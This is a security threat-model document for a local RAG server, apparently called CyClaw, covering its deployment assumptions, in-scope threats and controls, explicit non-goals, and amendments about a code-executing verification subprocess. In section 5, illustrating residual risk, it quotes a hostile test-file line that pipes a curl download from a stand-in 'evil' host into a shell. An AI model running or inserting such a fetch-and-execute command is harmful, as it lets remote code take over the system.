---
title: "CyClaw Threat Model & Sandbox Scope"
date: 2026-06-26
tags: [security, threat-model, sandbox, hardening, scope]
related:
  - .github/SECURITY.md
  - docs/audits/SECURITY_REVIEW_STATUS.md
  - docs/SECCOMP_EBPF_HARDENING.md
  - deploy/falco/README.md
---

# CyClaw Threat Model & Sandbox Scope

This document states plainly **what CyClaw's "sandbox" does and does not protect
against**, so the security posture is neither under-built nor over-sold. It
consolidates the threat-model assumptions previously scattered across
`CLAUDE.md`, `.claude/rules/PROJECT_RULES.md`, `.github/SECURITY.md`,
`config.yaml`, and code comments.

> 💡 **One-line stance:** CyClaw is a **single-operator, loopback-bound, local
> RAG server**. Its layered controls are strong *for that deployment*. It is
> **not** a multi-tenant platform for executing untrusted code, and does not
> claim microVM/hypervisor-grade isolation.

---

## 1. System assumptions (the deployment we secure for)

| Assumption | Value |
|---|---|
| Network exposure | Host exposure is **exclusively** `127.0.0.1:8787` — never a non-loopback host interface. Bare-metal runs bind loopback directly; the container deployment publishes only to host loopback (`127.0.0.1:8787:8787`) while uvicorn binds the container-private network namespace (`0.0.0.0` inside the container) so the publish can reach it. |
| Operators | **Single trusted operator** (or a small trusted home-lab/LAN). |
| Tenancy | **Single-tenant.** No mutual isolation between users is attempted. |
| Data store | Embedded ChromaDB (`PersistentClient`) + local BM25 + SQLite. No HTTP DB. |
| LLM | Local Ollama over loopback; optional Grok and/or Claude fallback (triple-gated per provider, off by default). |
| Outbound model egress | **Two planes, both off by default.** The core graph's triple-gated fallback (`mode==hybrid` AND `<provider>.enabled` AND `user_confirmed_online`), and the out-of-band Deep Agents harness behind a six-condition chain: `agentic.enabled`, `deepagent_github.enabled`, `allow_cloud_providers`, `providers.<name>.enabled`, the provider's API-key env var present, and a per-run `--confirm-online`. Destinations are `api.x.ai` and `api.anthropic.com` only. Harness egress is recorded as egress by `agentic/deepagent_github/handoff.py` — a SHA-256 of the outbound prompt, its length, the context doc ids, and a redaction count — never the prompt text. |
| Agentic / sync layers | **Out-of-band, opt-in, disabled by default.** Never imported by `gate.py`/`graph.py`/`mcp_hybrid_server.py`. |
| Host | A machine the operator controls. Host root is **trusted**. |

If you deploy outside these assumptions (internet-facing, multi-tenant, running
untrusted third-party skills), **re-evaluate** — several controls below are scoped
to the single-operator model and are not sufficient on their own for hostile
multi-tenant workloads.

---

## 2. In-scope adversaries & the control that answers each

| Threat | Primary control | Where |
|---|---|---|
| **Prompt injection** (direct) | 32-pattern sanitizer at `/query` and at index time | `utils/sanitizer.py`, `config.yaml` |
| **Indirect / RAG injection** (poisoned retrieved doc) | Retrieved context tagged untrusted in-prompt; topology never lets a doc redirect routing | `graph.py` (`UNTRUSTED_NOTE`, topology=policy) |
| **Corpus / memory poisoning** | Injection scan on ingestion; chunk sanitization | `retrieval/indexer.py`, `utils/sanitizer.py` |
| **Soul poisoning** (persisted identity hijack) | Soul writes require human `reason`; injection gate enforced at the write boundary; atomic `os.replace`; SHA-256 drift detection | `utils/personality.py`, `gate.py` |
| **Unauthorized soul mutation** | Fail-closed Bearer auth on all `/soul/*`; constant-time key compare | `gate.py` |
| **DNS-rebinding → state-changing POST** | `TrustedHostMiddleware` Host allow-list (outermost middleware) | `gate.py`, `config.yaml` |
| **Unauthorized cross-origin reads** | CORS allow-list | `gate.py`, `config.yaml` |
| **Uncontrolled external model calls** | Triple-gate: `mode=hybrid` **and** the selected provider's `grok.enabled`/`claude.enabled` **and** `user_confirmed_online` | `graph.py`, `config.yaml` |
| **Telemetry / data exfil via tracing** | Telemetry-kill env vars set before any import, by **every** entry point (gateway, MCP server, indexer CLI) from one shared mapping — an ambient value in the operator's environment is overwritten, not inherited; HF Hub network calls are additionally cut off via `local_files_only=True` once the embedding model is confirmed cached on disk (the `HF_HUB_OFFLINE`/`TRANSFORMERS_OFFLINE` env vars alone do not gate this in-process — huggingface_hub latches that constant at its own import time, which the eligibility probe itself triggers before the env vars are set; `local_files_only` is passed directly to `SentenceTransformer(...)` instead, which gates independently); raw query text never persisted (hashes only) | `utils/telemetry_kill.py`, `gate.py`, `mcp_hybrid_server.py`, `retrieval/vector_store.py`, `retrieval/embeddings.py`, `utils/logger.py` |
| **DoS (request flood / runaway process)** | Per-IP rate limit (60/min); container `mem`/`pids`/`cpus` limits | `utils/ratelimit.py`, `docker-compose.yml` |
| **Compromised out-of-band subprocess** (rclone/gh) | argv-list only (no `shell=True`); absolute binary paths; seccomp profile; non-root; `no-new-privileges`; `cap_drop: ALL`; read-only rootfs | `sync/`, `agentic/`, `Dockerfile`, `docker-compose.yml`, `deploy/seccomp/` |

---

## 3. What the sandbox layers DO cover

Container/OS-level controls currently enforced (see `Dockerfile` +
`docker-compose.yml`):

- **Loopback-only** publish (`127.0.0.1:8787`).
- **Non-root** runtime user (`uid:gid 1000:1000`), multi-stage minimal image.
- **`no-new-privileges:true`** — no setuid privilege escalation in-container.
- **`cap_drop: ALL`** — zero Linux capabilities.
- **Read-only root filesystem** with explicit writable carve-outs
  (`data`/`logs`/`checkpoints`/`.emb_cache` + `tmpfs:/tmp`).
- **seccomp profile** applied (`deploy/seccomp/sync-rclone.json`) — blocks
  `mount`, `ptrace`, `reboot`, etc.
- **Resource ceilings** (`mem_limit`, `pids_limit`, `cpus`).
- **Optional eBPF detection** (Falco, `deploy/falco/`) — disabled by default;
  logs anomalous exec/write/egress on the agentic & sync paths.

Application/architectural controls (the primary boundary — enforced by graph
topology, not prompts): the **five security invariants** (RAG-first,
topology=policy, triple-gated external, audit convergence, soul governance) and
**module isolation** (out-of-band layers never imported by core paths). See
`CLAUDE.md` and `.claude/rules/PROJECT_RULES.md`.

---

## 4. What the sandbox layers DO **not** cover (explicit non-goals)

> ⚠️ Do not rely on CyClaw for any of the following without additional, external
> controls. These are out of scope **by design** for the single-operator model.

- **Untrusted multi-tenant code execution.** CyClaw is not a platform for running
  arbitrary user-supplied code. `agentic/executor/` (added after this document's
  original write-up; see §5's dated note) can run `pytest`/`ruff`/the invariant
  guard as subprocesses over a worktree — that is real code execution, and this
  bullet no longer claims the agentic layer executes nothing. What it still
  claims, and what remains true: this is not multi-tenant, and it is not a
  platform for arbitrary *third-party* code — see §5 for the distinction and its
  limits.
- **A hard network boundary around the verification executor.** `agentic/executor`'s
  environment scrub (dropping proxy variables and API keys, setting
  `PIP_NO_INDEX`) is a best-effort software control, not a network namespace or
  firewall. It stops the common case — an HTTP-library-based request, or an
  accidental secret-env leak into a check's output — and does **not** stop a
  raw socket connection, which never consults `HTTPS_PROXY`. Treat any claim
  that a verified worktree "had no network access" as unverified until a real
  namespace/firewall control exists (§6, stage 5).
- **Kernel / hypervisor escape.** There is **no microVM** (gVisor/Firecracker).
  Container isolation shares the host kernel. A kernel-level escape is not
  contained. This is acceptable *only* because the workload is not untrusted code.
- **Hostile local root.** The host operator is trusted. CyClaw does not defend
  against a malicious root on the same machine.
- **Internet-facing / public multi-user deployment.** The loopback bind, CORS,
  and Host allow-list assume a trusted local caller. Exposing the port publicly
  voids the threat model.
- **Strong syscall *blocking* on the gate process.** The current seccomp profile
  permits the broad set the rclone/agentic subprocesses need. A tight,
  gate-specific block-list is **roadmap**, not present (see §6).
- **Confidentiality against a compromised Ollama / Grok / Claude endpoint.** Prompt and
  retrieved context are sent to the configured model; trust in that endpoint is
  assumed.
- **Provider-side retention of anything sent to Grok or Claude.** Once bytes reach
  a provider, retention and processing are governed by that provider's agreement,
  not by CyClaw. This is why every egress path ends in a per-use human confirmation.

---

## 5. Why microVM isolation is **not** required here

A 2026 review may reflexively call for gVisor/Firecracker microVMs around
"agentic code that can touch fs/sql." For CyClaw that recommendation targets a
threat that the architecture has already removed:

- **GitHub writes are hard-killed.** `agentic/writer.py` ships
  `EXECUTION_ENABLED = False`; `execute_write()` raises before doing anything and
  is `NotImplementedError` even if the flag were flipped. `plan_write()` only ever
  returns a dry-run plan.
- **SQL is read-only-guarded.** `agentic/sqlconnect/client.py` rejects every
  non-`SELECT` statement (and comments, and multi-statements) before execution.
- **Filesystem writes are triple-gated and off by default.** `writes_enabled`
  defaults `False`; writes additionally require a non-empty `reason` and `confirm`,
  and are confined to an allow-list of writable roots via zero-TOCTOU path checks.
- **Local governed writes exist and are not the same thing as GitHub writes.**
  Two agentic write paths are shipped, working, and default-off:
  `agentic/fsconnect/writer.py` (the filesystem writer above, which carries its
  own `FS_WRITE_HARD_DISABLE` module constant alongside the config gates) and
  `agentic/harness_optimizer/patching.py::apply_candidate_artifact`, which
  writes a SHA-256-versioned JSON record under `data/agentic/harness_optimizer/`
  after eight sequential gates including an independent injection re-check. Read
  "GitHub writes are hard-killed" above as scoped to GitHub — not as "the
  agentic layer never writes anything."
- **The skills registry never auto-writes.** `propose_skill` is advisory-only;
  `apply_skill` enforces the injection gate + `reason` and writes atomically to a
  single confined JSON path. All registry operations (`propose-skill` /
  `apply-skill`) are additionally gated on the `agentic.enabled` master switch:
  when the layer is disabled they no-op, so a registry write can never occur while
  the operator believes the layer is off (including via the API-key-gated
  `POST /ops/agentic` console).
- **No `shell=True` anywhere.** Every subprocess uses argv-list form with an
  absolute/fixed binary path.
- **Core paths exec nothing.** `gate.py`/`graph.py`/`mcp_hybrid_server.py` spawn
  no subprocesses and never import the agentic/sync layers.

The residual blast radius, as originally written here, was a governed,
injection-scanned JSON registry write and read-only GitHub/SQL access — **not**
untrusted code execution.

**[Amendment, added alongside `agentic/executor/`.]** That last clause needs a
correction, stated as plainly as the rest of this section: **code execution now
exists.** `agentic/executor/runner.py::run_verification` runs `pytest`, `ruff`,
and the invariant guard as real subprocesses over a worktree. This section's
own conclusion — that microVM containment isn't needed — still holds, but for a
narrower and more precise reason than "nothing executes":

- **The code is not untrusted third-party code.** It is either nothing yet (as
  of this amendment, no live caller produces a worktree with a model-authored
  diff in it — see the module's own docstring for exactly what's wired and what
  isn't), or, once a future phase wires a real planner and git-write flow, a
  patch the operator's own configured model proposed against the operator's own
  repository, already passed through the injection scan (§2), running through
  the operator's own pinned dev toolchain (`pytest`/`ruff`/the invariant guard —
  not an arbitrary command the patch gets to choose). This is a materially
  different threat than "run whatever an anonymous multi-tenant user uploads,"
  which is the threat gVisor/Firecracker actually target.

  **[Second amendment, added alongside the loop driver and git-write surface.]**
  Two of the three pieces that sentence called "future phase" now exist, each
  independently, and neither changes the conclusion above:

  - **A model-driven planner loop** (`agentic/harness_optimizer/loop_driver.py`)
    runs a plan → patch → verify → review cycle, but "verify" there means the
    existing deterministic train/holdout case checks and governance inspection
    `GitHubCodingRunner.evaluate()` already performed pre-amendment — it never
    calls `run_verification`, and it only ever overlays a candidate onto the
    committed 4-file fixture repository copied into a tempdir, never a real
    clone. It cannot produce a worktree for the executor to run against.
  - **A local git-write surface** (`agentic.deepagent_github.repo_workspace.
    RepoWorkspaceTools.checkout_branch`/`add`/`commit`/`diff`) can now commit
    inside the jailed clone `RepoWorkspaceTools.clone()` populates — still
    local only (no `push`, no GitHub API call), gated on its own
    default-`False` `deepagent_github.allow_git_write_tools` flag, and with
    the committer identity always forced to this project's own convention
    (never the operator's).

  Neither module calls the other, and neither calls `run_verification`. The
  loop driver never sees a real repository; the git-write surface never runs a
  test or a linter. So the residual risk section above still describes the
  honest state precisely: a real "planner proposes a diff against a real clone,
  it gets committed, and the executor verifies that commit" pipeline does not
  exist yet — three independently-shipped, independently-tested, independently
  gated pieces do, each smaller than the pipeline the first amendment
  described, and none of them wired to either of the others.
- **The residual risk this changes is real and is named, not hidden.** A
  hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
  genuinely can attempt to run arbitrary code within the executor subprocess's
  own privileges. The compensating controls are: a jailed worktree (nothing
  outside it is reachable through the checks themselves), a scrubbed,
  network-hostile environment (soft, not hard — see §4's new bullet above), a
  hard per-check wall-clock timeout, `check=False` so a non-zero exit is data
  rather than an exception, and no inherited secrets (API keys are not in the
  allowlisted environment). None of these is a kernel-level boundary.
- **What this does NOT change:** GitHub writes are still hard-killed (the
  bullet above is unaffected), SQL is still read-only-guarded, filesystem
  writes are still triple-gated, and the executor itself performs no writes of
  any kind — it reads a worktree and runs fixed, non-attacker-chosen commands
  against it.

MicroVM containment would still add operational weight and privileged host
requirements most single-operator deployments of CyClaw cannot assume. It
remains the honest next step (§6, stage 5) if the threat model ever widens
beyond "verify a change to my own configured repo" — e.g., if this executor
were ever pointed at a repo, or dev-toolchain command, the operator did not
themselves configure. Until that widening happens, stage 5 stays conditional,
not because nothing executes, but because what executes is scoped, known, and
not attacker-chosen at the command level.

---

## 6. Hardening maturity ladder

| Stage | Control | Status |
|---|---|---|
| 0 | Loopback bind, non-root, telemetry-kill, injection filter, topology invariants | ✅ Done |
| 1 | `no-new-privileges`, `cap_drop: ALL`, read-only rootfs, resource limits, seccomp on rclone/agentic path | ✅ Done |
| 2 | eBPF **detection** (Falco) over agentic/sync/gate, disabled-by-default | ✅ Scaffold shipped (`deploy/falco/`) |
| 3 | eBPF-**profiled**, tight gate-specific seccomp block-list (replace the broad profile) | 🔜 Roadmap — needs syscall traces first |
| 4 | Landlock / AppArmor profiles for filesystem confinement | 🔜 Roadmap |
| 5 | gVisor / Firecracker microVM around any future *untrusted-workload* mode | ⏸ Conditional — only if the untrusted-exec threat appears |

Stage 3 deliberately depends on Stage 2: the minimal `deploy/seccomp/gate-seccomp.json`
floor (16 syscalls) cannot boot `uvicorn`+`torch`+`chromadb`, so a correct
gate-specific profile must be *generated from real eBPF traces*, not hand-guessed.
Until then the gate runs under the broader, working profile.

---

## 7. Reporting

Security issues: follow [`.github/SECURITY.md`](../.github/SECURITY.md). Resolved
findings and their status live in
[`docs/audits/SECURITY_REVIEW_STATUS.md`](./audits/SECURITY_REVIEW_STATUS.md).
